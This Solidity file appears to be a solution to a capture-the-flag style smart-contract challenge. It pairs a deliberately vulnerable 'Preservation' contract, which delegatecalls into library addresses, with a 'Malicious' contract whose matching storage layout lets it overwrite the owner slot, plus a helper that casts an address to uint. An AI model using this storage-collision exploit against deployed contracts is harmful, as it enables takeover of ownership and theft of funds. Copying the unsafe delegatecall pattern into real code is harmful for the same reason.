// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

contract Malicious {
  address public ttimeZone1Library;
  address public ttimeZone2Library;
  address public oowner; 
  uint storedTime;
  //bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  //address public myAddress = 0x51d19775FCbBf45218fAB34057e790EE057684B2;

//    function addToUint() public view returns(uint) {
//        return uint(address(this));
//    }

  function setTime(uint _time) public {
    //timeZone2Library = msg.sender;
    oowner = msg.sender;
  }
}

contract addToUint {

      function addToUints(address _maliAddr) public pure returns(uint) {
       return uint(_maliAddr);
   } 
}
